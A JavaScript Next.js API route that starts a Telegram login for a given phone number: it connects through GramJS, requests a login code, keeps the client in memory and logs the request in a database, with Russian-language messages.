// src/app/api/session-gen/start/route.js
export const dynamic = 'force-dynamic'
import { NextResponse } from 'next/server'
import { prisma } from '@/lib/prisma'
import { env } from '@/lib/env'

// In-memory store for active auth sessions
const authSessions = new Map()

export async function POST(req) {
  const { phone } = await req.json()
  if (!phone) return NextResponse.json({ error: 'Введи номер телефона' }, { status: 400 })

  try {
    const { TelegramClient } = await import('telegram')
    const { StringSession } = await import('telegram/sessions/index.js')

    const session = new StringSession('')
    const client = new TelegramClient(session, env.TG_API_ID, env.TG_API_HASH, {
      connectionRetries: 3,
      deviceModel: 'Samsung Galaxy S23',
      systemVersion: 'Android 13',
    })

    await client.connect()
    await client.sendCode({ apiId: env.TG_API_ID, apiHash: env.TG_API_HASH }, phone)

    // Store client in memory (keyed by phone)
    authSessions.set(phone, { client, session })

    // Save request to DB
    await prisma.sessionRequest.upsert({
      where: { id: -1 },
      create: { phone, status: 'code_sent' },
      update: { status: 'code_sent' },
    }).catch(() => prisma.sessionRequest.create({ data: { phone, status: 'code_sent' } }))

    return NextResponse.json({ ok: true, message: 'Код отправлен в Telegram' })
  } catch (err) {
    return NextResponse.json({ error: `Ошибка: ${err.message}` }, { status: 500 })
  }
}
